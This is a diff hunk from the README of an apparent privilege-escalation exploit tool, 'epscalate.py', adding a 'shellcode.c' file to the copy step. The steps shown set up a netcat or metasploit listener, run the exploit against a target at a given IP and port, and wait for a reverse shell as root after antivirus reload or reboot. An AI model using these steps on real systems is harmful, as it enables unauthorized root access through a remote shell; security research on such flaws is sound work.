@@ -17,7 +17,7 @@ The exploit is a simple Python file that aids in the exploitation of the vulnera
 
 Steps:
 1. On the attacker machine, start a listener using netcat (`nc -lvp <port>`) or metasploit (`multi/handler`).
-2. Copy/download the `epscalate.py` file onto the target system.
+2. Copy/download the `epscalate.py` and `shellcode.c` file onto the target system.
 3. Run the python file with proper arguments (`python3 epscalate.py -H 192.168.0.103:9999 -I`).
 4. Wait for the AV to reload / the system to reboot.
 5. The reverse connection to your listener can confirm code execution as root.
